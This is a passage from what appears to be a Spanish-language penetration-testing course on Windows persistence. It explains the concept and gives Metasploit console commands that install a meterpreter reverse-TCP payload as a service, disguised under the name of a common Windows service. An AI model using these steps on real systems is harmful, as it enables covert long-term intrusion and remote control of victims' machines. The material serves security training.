# Persistencia en Windows

La persistencia consiste en técnicas usadas para mantener el acceso a un sistema a pesar de los reinicios, cambios de credenciales y otras interrupciones que puedan afectar al acceso. Estas técnicas incluyen cualquier acceso, acción o cambio de configuración que permita mantener un punto de apoyo en el sistema. Pueden ser reemplazar o secuestrar (hijacking) código legítimo.

Hijacking significa alterar el flujo normal de ejecución de un programa legítimo para que el sistema ejecute el código del atacante de forma automática y repetitiva.

## Persistencia mediante servicios

Para esta técnica podemos usar el módulo `persistence_service` de metasploit (`exploit/windows/persistence/service` en versiones recientes). Su funcionamiento consiste en los siguientes pasos:

1. Generar un ejecutable (payload).
2. Cargar un ejecutable en el sistema objetivo.
3. Crear un servicio persistente. 
4. Este servicio ejecuta el payload cada vez que se encuentra activo.

```bash
msf > use exploit/windows/persistence/service
[*] Using configured payload windows/meterpreter/reverse_tcp
msf exploit(windows/persistence/service) > set lport <puerto> # debe ser distinto a la sesión actual
msf exploit(windows/persistence/service) > set session <id>
# lo siguiente no es necesario para la ejecución, pero permite 
# ocultar el servicio si le damos el nombre de un servicio común en windows
msf exploit(windows/persistence/service) > set service_name <nombre>
msf exploit(windows/persistence/service) > exploit
```

[⟵ Anterior](07_linux_privesc.md) | [Siguiente ⟶](09_linux_pers.md)

